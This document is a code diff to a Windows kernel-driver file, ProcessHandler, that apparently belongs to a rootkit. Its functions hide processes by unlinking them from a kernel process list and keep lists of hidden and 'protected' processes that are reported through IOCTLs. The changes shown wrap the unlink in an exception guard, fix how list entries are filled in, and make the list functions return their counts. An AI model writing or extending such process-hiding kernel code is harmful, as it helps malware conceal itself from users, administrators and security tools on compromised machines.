@@ -2,7 +2,7 @@
 #include "ProcessHandler.h"
 
 _IRQL_requires_max_(APC_LEVEL)
-ProcessHandler::ProcessHandler() {
+ProcessHandler::ProcessHandler() noexcept {
 	this->protectedProcesses.Count = 0;
 	InitializeListHead(this->protectedProcesses.Items);
 	this->protectedProcesses.Lock.Init();
@@ -94,7 +94,12 @@ NTSTATUS ProcessHandler::HideProcess(_In_ ULONG pid) {
 		return STATUS_UNSUCCESSFUL;
 	}
 
-	status = RemoveEntryList(processListEntry) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
+	__try {
+		status = RemoveEntryList(processListEntry) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		status = GetExceptionCode();
+	}
 	// RemoveListLinks(processListEntry);
 	ExReleasePushLockExclusive(listLock);
 	ObDereferenceObject(targetProcess);
@@ -283,7 +288,7 @@ bool ProcessHandler::FindProcess(_In_ ULONG pid, _In_ ProcessType type) const {
 * @bool				-- Whether successfully added or not.
 */
 _IRQL_requires_max_(APC_LEVEL)
-bool ProcessHandler::AddProtectedProcess(_In_ ULONG pid) {
+bool ProcessHandler::ProtectProcess(_In_ ULONG pid) {
 	if (!IsValidPid(pid))
 		return false;
 
@@ -293,7 +298,10 @@ bool ProcessHandler::AddProtectedProcess(_In_ ULONG pid) {
 
 	if (!newEntry)
 		return false;
-	return AddEntry<ProcessList, ProtectedProcessEntry>(protectedProcesses, newEntry);
+	newEntry->Pid = pid;
+	AddEntry<ProcessList, ProtectedProcessEntry>(protectedProcesses, newEntry);
+
+	return true;
 }
 
 /*
@@ -317,7 +325,10 @@ bool ProcessHandler::AddHiddenProcess(_In_ HiddenProcessEntry hiddenProcess) {
 
 	if (!newEntry)
 		return false;
-	return AddEntry<ProcessList, HiddenProcessEntry>(hiddenProcesses, newEntry);
+	newEntry->Pid = hiddenProcess.Pid;
+	newEntry->OriginalEntry = hiddenProcess.OriginalEntry;
+	AddEntry<ProcessList, HiddenProcessEntry>(hiddenProcesses, newEntry);
+	return true;
 }
 
 /*
@@ -333,23 +344,21 @@ bool ProcessHandler::AddHiddenProcess(_In_ HiddenProcessEntry hiddenProcess) {
 */
 _IRQL_requires_max_(APC_LEVEL)
 bool ProcessHandler::RemoveProcess(_In_ ULONG pid, _In_ ProcessType type) {
-	ProtectedProcessEntry entry = { 0 };
-
 	if (!IsValidPid(pid))
 		return false;
 
 	switch (type) {
 	case ProcessType::Protected: {
-		auto finder = [](const ProtectedProcessEntry* item, ULONG searchable) {
-			return item->Pid == searchable;
+		auto finder = [](_In_ const ProtectedProcessEntry* item, _In_ ULONG pid) {
+			return item->Pid == pid;
 			};
 		ProtectedProcessEntry* entry = FindListEntry<ProcessList, ProtectedProcessEntry, ULONG>(protectedProcesses, pid, finder);
 		return RemoveListEntry<ProcessList, ProtectedProcessEntry>(protectedProcesses, entry);
 	}
 	
 	case ProcessType::Hidden: {
-		auto finder = [](const HiddenProcessEntry* item, ULONG searchable) {
-			return item->Pid == searchable;
+		auto finder = [](_In_ const HiddenProcessEntry* item, _In_ ULONG pid) {
+			return item->Pid == pid;
 			};
 		HiddenProcessEntry* entry = FindListEntry<ProcessList, HiddenProcessEntry, ULONG>(hiddenProcesses, pid, finder);
 		return RemoveListEntry<ProcessList, HiddenProcessEntry>(hiddenProcesses, entry);
@@ -378,8 +387,6 @@ void ProcessHandler::ClearProcessList(_In_ ProcessType type) {
 	case ProcessType::Hidden:
 		ClearList<ProcessList, HiddenProcessEntry>(this->hiddenProcesses);
 		break;
-	default:
-		return;
 	}
 }
 
@@ -434,6 +441,9 @@ bool ProcessHandler::ListProtectedProcesses(_Inout_ IoctlProcessList* processLis
 		count++;
 		currentEntry = currentEntry->Flink;
 	}
+
+	processList->Count = count;
+	return true;
 }
 
 /*
@@ -487,6 +497,9 @@ bool ProcessHandler::ListHiddenProcesses(_Inout_ IoctlProcessList* processList) 
 		count++;
 		currentEntry = currentEntry->Flink;
 	}
+
+	processList->Count = count;
+	return true;
 }
 
 /*
